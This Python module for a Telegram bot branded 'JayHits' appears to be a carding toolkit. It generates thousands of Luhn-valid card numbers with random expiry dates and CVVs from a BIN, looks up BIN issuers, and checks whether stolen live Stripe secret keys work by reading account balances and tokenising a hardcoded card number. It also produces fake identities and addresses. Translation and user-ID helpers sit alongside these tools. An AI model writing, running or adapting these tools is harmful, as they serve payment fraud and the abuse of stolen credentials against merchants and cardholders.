import re
import time
import random
import string
import requests
import asyncio
from datetime import datetime

BOT_TAG = None
BOT_LINK = None

def set_bot_username(username: str):
    global BOT_TAG, BOT_LINK
    clean = username.lstrip("@")
    BOT_TAG = f"@{clean}"
    BOT_LINK = f"https://t.me/{clean}"


def checkLuhn(cardNo):
    nDigits = len(cardNo)
    nSum = 0
    isSecond = False
    for i in range(nDigits - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
        if isSecond:
            d = d * 2
        nSum += d // 10
        nSum += d % 10
        isSecond = not isSecond
    return (nSum % 10 == 0)


def cc_gen(bin_code, amount, mes=None, ano=None, cvv=None):
    generated_cards = []
    current_year = datetime.now().year
    max_attempts = amount * 50

    attempts = 0
    while len(generated_cards) < amount and attempts < max_attempts:
        attempts += 1
        working_bin = bin_code
        if 'x' in working_bin:
            random_digits = ''.join([str(random.randint(0, 9)) for _ in range(working_bin.count('x'))])
            working_bin = working_bin.replace('x', '{}').format(*random_digits)

        card_length = 15 if working_bin.startswith('37') else 16

        if len(working_bin) < card_length:
            cc_base = working_bin + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(working_bin))])
        else:
            cc_base = working_bin[:card_length]

        if not checkLuhn(cc_base):
            continue

        card_mes = mes if mes and mes != 'xx' else f'{random.randint(1, 12):02}'
        card_ano = ano if ano and ano != 'xx' else str(random.randint(current_year + 1, current_year + 5))

        if not cvv or cvv == 'xxx' or not cvv.isdigit():
            card_cvv = str(random.randint(1000, 9999) if cc_base.startswith('37') else random.randint(100, 999))
        else:
            card_cvv = cvv

        generated_cards.append(f"{cc_base}|{card_mes}|{card_ano}|{card_cvv}")

    return generated_cards


async def tool_gen(text, user_id, first_name, rank):
    parts_raw = text.split()
    if len(parts_raw) < 2:
        return "**Usage:** `/gen 456789|month|year|cvv`"

    input_data = parts_raw[1].lower()
    parts = re.split(r'[/:;.,\s|]+', input_data)

    bin_code = parts[0]
    mes = parts[1] if len(parts) > 1 and parts[1].isdigit() else 'xx'
    ano = parts[2] if len(parts) > 2 and parts[2].isdigit() else 'xx'
    cvv = parts[3] if len(parts) > 3 and parts[3].isdigit() else 'xxx'

    if ano != 'xx' and len(ano) == 2:
        ano = '20' + ano

    clean_bin = bin_code.replace('x', '')
    if not (6 <= len(clean_bin) <= 16):
        return "**Invalid BIN format.** Provide 6-16 digits."

    amount = 10
    if len(parts_raw) > 2 and parts_raw[2].isdigit():
        amount = min(int(parts_raw[2]), 10000)

    try:
        req = requests.get(f"https://bins.antipublic.cc/bins/{clean_bin[:6]}", timeout=5).json()
        brand = req.get('brand', '------')
        country_name = req.get('country', '------')
        country_flag = req.get('flag', '')
        bank = req.get('bank', '------')
        level = req.get('level', '------')
        typea = req.get('type', '------')
    except Exception:
        brand = country_name = bank = level = typea = '------'
        country_flag = ''

    t0 = time.perf_counter()
    generated_cards = cc_gen(bin_code, amount, mes, ano, cvv)
    t1 = time.perf_counter()

    if amount > 30:
        import tempfile, os
        file_path = os.path.join(tempfile.gettempdir(), f"gen_{bin_code[:6]}_{amount}.txt")
        with open(file_path, "w") as f:
            f.write('\n'.join(generated_cards))

        text = f"""**JayHits CC Generator**
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
**BIN:** `{bin_code[:6]}` | **Exp:** `{mes}|{ano}` | **CVV:** `{cvv}`
**Amount:** `{amount}` (sent as file)
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
**BIN Info:** {brand} - {typea} - {level}
**Bank:** `{bank}`
**Country:** {country_name} {country_flag}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
**Time:** `{t1 - t0:0.2f}s`
**Req By:** [{first_name}](tg://user?id={user_id}) **[{rank}]**
**Bot:** {BOT_TAG}"""
        return {"text": text, "file": file_path}

    card_list = '\n'.join([f'`{card}`' for card in generated_cards])
    return f"""**JayHits CC Generator**
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
**BIN:** `{bin_code[:6]}` | **Exp:** `{mes}|{ano}` | **CVV:** `{cvv}`
**Amount:** `{amount}`
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
**Generated Cards:**
{card_list}

**BIN Info:** {brand} - {typea} - {level}
**Bank:** `{bank}`
**Country:** {country_name} {country_flag}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
**Time:** `{t1 - t0:0.2f}s`
**Req By:** [{first_name}](tg://user?id={user_id}) **[{rank}]**
**Bot:** {BOT_TAG}"""


async def tool_bin(text, user_id, first_name, rank):
    bin_match = re.findall(r'\b(\d{6,8})', text)
    if not bin_match:
        return "**Usage:** `/bin 440393`"

    BIN = bin_match[0][:6]

    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{BIN}", timeout=8)
        if response.status_code != 200:
            return "BIN not found."
        req = response.json()
        brand = req.get('brand', '------')
        typea = req.get('type', '------')
        level = req.get('level', '------')
        bank = req.get('bank', '------')
        country = req.get('country', '------')
        country_flag = req.get('flag', '')

        return f"""**JayHits BIN Lookup**
━━━━━━━━━━━━━━━━━
**BIN:** `{BIN}`
**Info:** {brand} - {typea} - {level}
**Issuer:** `{bank}`
**Country:** {country} {country_flag}
━━━━━━━━━━━━━━━━━
**Req By:** [{first_name}](tg://user?id={user_id}) **[{rank}]**
**Bot:** {BOT_TAG}"""
    except Exception:
        return "Error looking up BIN. Try again."


async def tool_sk(text, user_id, first_name, rank):
    parts = text.split()
    sk = None
    if len(parts) >= 2:
        sk = parts[1]
    else:
        return "**Usage:** `/sk sk_live_xxxxx`"

    if not sk.startswith('sk_live_'):
        return "**Invalid SK key.** Must start with `sk_live_`"

    tic = time.perf_counter()

    try:
        from requests.auth import HTTPBasicAuth
        auth = HTTPBasicAuth(sk, '')

        bal_res = requests.get("https://api.stripe.com/v1/balance", auth=auth, timeout=10)
        bal_dt = bal_res.json()

        try:
            avl_bln = bal_dt['available'][0]['amount']
            pnd_bln = bal_dt['pending'][0]['amount']
            crn = bal_dt['available'][0]['currency']
        except (KeyError, IndexError):
            toc = time.perf_counter()
            return f"""**JayHits Stripe Key Lookup**
━━━━━━━━━━━━
**SK:** `{sk}`
**Response:** SK Key Revoked / Dead
━━━━━━━━━━━━━━━━━
**Req By:** [{first_name}](tg://user?id={user_id}) **[{rank}]**
**Bot:** {BOT_TAG}"""

        acc_res = requests.get("https://api.stripe.com/v1/account", auth=auth, timeout=10)
        acc_data = acc_res.json()
        acc_id = acc_data.get('id', 'N/A')
        pay_meth = acc_data.get('capabilities', {}).get('card_payments', 'N/A')
        payments = acc_data.get('charges_enabled', False)
        url = acc_data.get('business_profile', {}).get('url', 'N/A')

        chk_data = 'card[number]=5581585612888772&card[exp_month]=12&card[exp_year]=2029&card[cvc]=354'
        rep = requests.post("https://api.stripe.com/v1/tokens", data=chk_data, auth=auth, timeout=10)
        repp = rep.text

        if 'rate_limit' in repp:
            r_text = 'Rate Limit (Live)'
        elif 'tok_' in repp:
            r_text = 'Live Key'
        elif 'Invalid API Key' in repp:
            r_text = 'Invalid API Key'
        elif 'testmode_charges_only' in repp or 'test_mode_live_card' in repp:
            r_text = 'Test Mode Only'
        elif 'api_key_expired' in repp:
            r_text = 'API Key Expired'
        else:
            r_text = 'Dead'

        toc = time.perf_counter()
        return f"""**JayHits Stripe Key Lookup**
━━━━━━━━━━━━
**SK:** `{sk}`
**Response:** `{r_text}`
━━━━━━━━━━━━━━━━━
**Account ID:** `{acc_id}`
**URL:** `{url}`
**Card Payments:** {pay_meth}
**Charges Enabled:** {payments}
**Currency:** {crn}
**Available Balance:** {avl_bln}
**Pending Balance:** {pnd_bln}
━━━━━━━━━━━━━━━━━
**Time:** `{toc - tic:.2f}s`
**Req By:** [{first_name}](tg://user?id={user_id}) **[{rank}]**
**Bot:** {BOT_TAG}"""

    except Exception as e:
        return f"Error checking SK: {str(e)[:100]}"


async def tool_id(user_id, first_name, username, chat_id, rank, expiry=None, is_reply=False):
    expire_str = str(expiry) if expiry else 'No expiry'
    title = "Replied User Information" if is_reply else "User Information"

    return f"""**JayHits {title}**
━━━━━━━━━━━━━━━━
**Name:** {first_name}
**Username:** @{username or 'N/A'}
**User ID:** `{user_id}`
**Chat ID:** `{chat_id}`
**Rank:** **{rank}**
**Expiry:** **{expire_str}**
━━━━━━━━━━━━━━━━
**Bot:** {BOT_TAG}"""


async def tool_ping():
    return None


async def tool_rand(text, user_id, first_name, rank):
    parts = text.split()
    if len(parts) < 2:
        return "**Usage:** `/rand US` (country code: US, CA, MX, FR, UK, etc.)"

    country = parts[1].upper()
    if len(country) != 2:
        return f"Invalid country code '{country}'. Use 2-letter codes like US, CA, MX."

    t0 = time.perf_counter()
    try:
        api = requests.get(f"https://randomuser.me/api/?nat={country}&inc=name,location,phone", timeout=8).json()
        result = api["results"][0]
        nombre = result["name"]["first"]
        last = result["name"]["last"]
        loca = result["location"]["street"]["name"]
        nm = result["location"]["street"]["number"]
        city = result["location"]["city"]
        state = result["location"]["state"]
        country_name = result["location"]["country"]
        postcode = result["location"]["postcode"]
        phone = result["phone"]

        randstr = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 15)))
        email = f"{randstr}@gmail.com"

        t1 = time.perf_counter()

        return f"""**JayHits Fake Address Generator**
━━━━━━━━━━━━
**Name:** `{nombre} {last}`
**Street:** `{loca} {nm}`
**City:** `{city}`
**State:** `{state}`
**Country:** `{country_name}`
**Postal Code:** `{postcode}`
**Phone:** `{phone}`
**Email:** `{email}`
━━━━━━━━━━━━
**Time:** `{t1 - t0:0.2f}s`
**Req By:** [{first_name}](tg://user?id={user_id}) **[{rank}]**
**Bot:** {BOT_TAG}"""
    except Exception as e:
        return f"Error generating address: {str(e)[:100]}"


async def tool_translate(text, user_id, first_name, rank):
    try:
        from googletrans import Translator, LANGUAGES
        translator = Translator()
    except ImportError:
        return "Translator module not available."

    try:
        inp = text[len('/tr '):].strip()
        if len(inp) < 3:
            return "**Usage:** `/tr en Hello World` or reply to a message with `/tr es`"

        rd3_lang = inp[:2].lower()
        if rd3_lang not in LANGUAGES:
            return f"Invalid language code `{rd3_lang}`. Use `/langcode` to see available codes."

        source_text = inp[3:].strip()
        if not source_text:
            return "No text to translate. Provide text after the language code."

        translation = translator.translate(source_text, dest=rd3_lang)
        translated_text = translation.text

        return f"""**JayHits Translator**
━━━━━━━━━━━━━━
**Language:** `{rd3_lang.upper()}`
**Translated Text:**
{translated_text}
━━━━━━━━━━━━━━
**Req By:** [{first_name}](tg://user?id={user_id}) **[{rank}]**
**Bot:** {BOT_TAG}"""
    except Exception:
        return "Invalid format. Use: `/tr en Hello World`"


async def tool_langcode():
    try:
        from googletrans import LANGUAGES
        unique = {}
        for k, v in LANGUAGES.items():
            if v not in unique.values():
                unique[k] = v
        codes = '\n'.join([f'`{k}`: {v}' for k, v in unique.items()])
        return f"**Available Language Codes:**\n{codes}"
    except ImportError:
        return "Translator module not available."
